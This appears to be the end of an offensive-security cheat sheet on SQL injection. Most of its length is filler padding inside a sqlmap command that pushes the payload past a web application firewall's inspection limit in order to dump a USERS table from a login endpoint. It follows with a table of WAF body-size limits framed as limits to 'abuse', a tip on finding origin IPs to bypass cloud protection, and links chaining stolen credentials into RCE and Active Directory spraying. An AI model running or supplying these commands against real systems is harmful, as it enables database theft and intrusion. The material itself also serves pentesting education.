asdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasd&recover=1&user=admin*" --url https://target.com/redacted/login.php?callback=blabla --dbs --batch -D MAIN -T USERS --dump
```

### WAF body-inspection limits you can abuse

The generalised version of the trick above: every WAF stops inspecting a request body at some size, but the application still parses all of it. Push the payload past the line and only the backend sees it.

| WAF provider | Maximum request body inspection size |
| --- | --- |
| Cloudflare | 128 KB (ruleset engine), up to 500 MB (Enterprise) |
| AWS WAF | 8 KB – 64 KB (configurable by service) |
| Akamai | 8 KB – 128 KB |
| Azure WAF | 128 KB |
| FortiWeb (Fortinet) | 100 MB |
| Barracuda WAF | 64 KB |
| Sucuri | 10 MB |
| Radware AppWall | Up to 1 GB (Cloud WAF) |
| F5 BIG-IP WAAP | 20 MB (configurable) |
| Palo Alto | 10 MB |
| Google Cloud Armor | 8 KB (can be increased to 128 KB) |

!!! tip "Go around the WAF, not through it"
    Find the origin IP first (FOFA, Shodan, historical DNS), point your host file at it, and test the application directly — no cloud protection in the path at all. Every bypass above becomes unnecessary if the edge isn't in the request.

## :material-link-variant: Related

- Chains into [File Upload](file-upload.md) and [Deserialization](deserialization.md) for RCE.
- MSSQL `xp_cmdshell` → [Windows Privesc](../privesc/windows.md).
- Dumped creds → spray them in [Active Directory](../network/active-directory.md).
- See also: [OWASP SQLi](https://owasp.org/www-community/attacks/SQL_Injection), [PortSwigger SQLi labs](https://portswigger.net/web-security/sql-injection).
